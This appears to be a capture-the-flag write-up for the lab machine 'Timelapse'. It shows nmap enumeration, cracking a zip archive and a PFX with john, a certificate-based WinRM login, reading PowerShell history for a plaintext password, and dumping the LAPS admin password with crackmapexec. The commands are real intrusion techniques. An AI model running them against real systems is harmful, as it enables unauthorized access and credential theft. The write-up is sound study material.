# Timelapse (Easy)

A password-protected PFX found on an SMB share leads to a client certificate login, with a plaintext password in PowerShell history leading to LAPS password dumping.

## Enumeration

```bash
nmap -sC -sV -p- <target>
```

```
53/tcp    open domain
88/tcp    open kerberos-sec  (Domain: timelapse.htb)
135/tcp   open msrpc
139/tcp   open netbios-ssn
389/tcp   open ldap
445/tcp   open microsoft-ds?
464/tcp   open kpasswd5?
593/tcp   open ncacn_http
636/tcp   open tcpwrapped
3268/tcp  open ldap
3269/tcp  open tcpwrapped
5986/tcp  open ssl/http      (cert CN=dc01.timelapse.htb)
9389/tcp  open mc-nmf
```

## Foothold — PFX cracking → cert-based WinRM

Anonymous SMB access to a `Shares` folder yielded `winrm_backup.zip`, password-protected:

```bash
zip2john winrm_backup.zip > zip.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=pkzip zip.txt
```

Inside: `legacyy_dev_auth.pfx`, also password-protected:

```bash
pfx2john legacyy_dev_auth.pfx > legacy.txt
john --wordlist=/usr/share/wordlists/rockyou.txt legacy.txt
```

Cracked password redacted (`<REDACTED>`). Extracted the private key and certificate:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
openssl rsa -in key.pem -out server.key
```

```bash
evil-winrm -i <target> -c cert.pem -k server.key -S
```
→ `user.txt` retrieved.

## Privilege Escalation — PSReadLine history → LAPS

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Revealed a plaintext password for the `svc_deploy` service account (redacted). This account belongs to the group with rights to **LAPS** (Local Administrator Password Solution):

```bash
evil-winrm -i <target> -u svc_deploy -p '<REDACTED>' -S
net user svc_deploy
crackmapexec ldap <target> -u svc_deploy -p '<REDACTED>' --kdcHost <target> -M laps
```

CrackMapExec's LAPS module dumped the current rotated local Administrator password (redacted). Verified and used:

```bash
crackmapexec smb <target> -u 'administrator' -p '<REDACTED>'
evil-winrm -i <target> -u administrator -p '<REDACTED>' -S
```
→ `root.txt` found (note: in this box it was located under a different user's Desktop, not the default `Administrator\Desktop`).

## Takeaways

- Treat any password-protected archive/PFX found on a share as crackable with `rockyou.txt` — these labs favor weak reused passwords.
- PowerShell command history is frequently overlooked and often contains plaintext credentials.
- LAPS-reader group membership is equivalent to local admin on every LAPS-managed host.
